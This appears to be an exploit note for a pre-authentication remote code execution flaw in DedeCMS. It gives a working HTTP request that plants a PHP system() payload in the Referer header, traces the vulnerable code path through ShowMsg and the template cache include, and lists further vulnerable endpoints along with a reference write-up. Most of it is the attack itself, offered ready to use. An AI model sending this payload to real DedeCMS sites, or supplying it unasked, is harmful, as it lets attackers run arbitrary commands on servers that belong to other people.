### Pre-auth RCE
```
GET /plus/flink.php?dopost=save&c=id HTTP/1.1
Host: target
Referer: <?php "system"($c);die;/*
```

details：

`plus/flink.php`:
```php
if ($dopost == 'save') {
    $validate = isset($validate) ? strtolower(trim($validate)) : '';
    $svali = GetCkVdValue();
    if ($validate == '' || $validate != $svali) {
        ShowMsg('验证码不正确!', '-1'); // 1
        exit();
    }
```

`include/common.func.php`:
```php
function ShowMsg($msg, $gourl, $onlymsg = 0, $limittime = 0){
$gourl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

$func .= "var pgo=0;
      function JumpUrl(){
        if(pgo==0){ location='$gourl'; pgo=1; }
      }\r\n";
        $rmsg = $func;
        
$msg = $htmlhead . $rmsg . $htmlfoot;


    $tpl = new DedeTemplate();
    $tpl->LoadString($msg);
    $tpl->Display();
    
}
```

`include/dedetemplate.class.php`:
```php
    public function Display()
    {
        global $gtmpfile;
        extract($GLOBALS, EXTR_SKIP);
        $this->WriteCache(); // 7
        include $this->cacheFile; // 9
    }
```


other endpoints:
```
/plus/flink.php?dopost=save
/plus/users_products.php?oid=1337
/plus/download.php?aid=1337
/plus/showphoto.php?aid=1337
/plus/users-do.php?fmdo=sendMail
/plus/posttocar.php?id=1337
/plus/vote.php?dopost=view
/plus/carbuyaction.php?do=clickout
/plus/recommend.php
…
```

ref:
- [Chasing a Dream :: Pre-authenticated Remote Code Execution in Dedecms](https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html)
